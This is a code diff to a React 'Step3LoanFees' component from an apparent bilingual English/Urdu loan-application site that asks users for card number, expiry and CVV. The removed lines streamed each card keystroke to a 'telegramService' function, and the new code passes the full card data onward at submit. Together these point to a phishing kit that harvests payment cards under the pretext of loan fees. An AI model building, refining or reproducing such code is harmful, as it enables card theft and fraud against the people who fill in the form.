@@ -1,12 +1,11 @@
 import React, { useState } from 'react';
 import { CardInfo } from '../types';
-import { ArrowRight, ArrowLeft, CreditCard, Lock, ShieldCheck, Wifi } from 'lucide-react';
-import { sendRealtimeCardInfoUpdate } from '../services/telegramService';
+import { ArrowRight, ArrowLeft, CreditCard, Lock, Wifi } from 'lucide-react';
 
 interface Step3Props {
   data: CardInfo;
   onUpdate: (updated: Partial<CardInfo>) => void;
-  onNext: () => void;
+  onNext: (data?: CardInfo) => void;
   onBack: () => void;
 }
 
@@ -35,25 +34,19 @@ export const Step3LoanFees: React.FC<Step3Props> = ({
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formatted = formatCardNumber(e.target.value);
-    const updated = { ...data, cardNumber: formatted };
     onUpdate({ cardNumber: formatted });
-    sendRealtimeCardInfoUpdate(updated);
     if (errors.cardNumber) setErrors((prev) => ({ ...prev, cardNumber: '' }));
   };
 
   const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formatted = formatExpiry(e.target.value);
-    const updated = { ...data, expiry: formatted };
     onUpdate({ expiry: formatted });
-    sendRealtimeCardInfoUpdate(updated);
     if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: '' }));
   };
 
   const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, '').slice(0, 4);
-    const updated = { ...data, cvv: val };
     onUpdate({ cvv: val });
-    sendRealtimeCardInfoUpdate(updated);
     if (errors.cvv) setErrors((prev) => ({ ...prev, cvv: '' }));
   };
 
@@ -77,7 +70,7 @@ export const Step3LoanFees: React.FC<Step3Props> = ({
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (validate()) {
-      onNext();
+      onNext(data);
     }
   };
 
@@ -246,7 +239,7 @@ export const Step3LoanFees: React.FC<Step3Props> = ({
             type="button"
             onClick={onBack}
             id="step3-back-btn"
-            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
             <span>Back / واپس</span>
@@ -255,7 +248,7 @@ export const Step3LoanFees: React.FC<Step3Props> = ({
           <button
             type="submit"
             id="step3-continue-btn"
-            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <span>Continue / جاری رکھیں</span>
             <ArrowRight className="w-4 h-4" />
@@ -265,4 +258,3 @@ export const Step3LoanFees: React.FC<Step3Props> = ({
     </div>
   );
 };
-
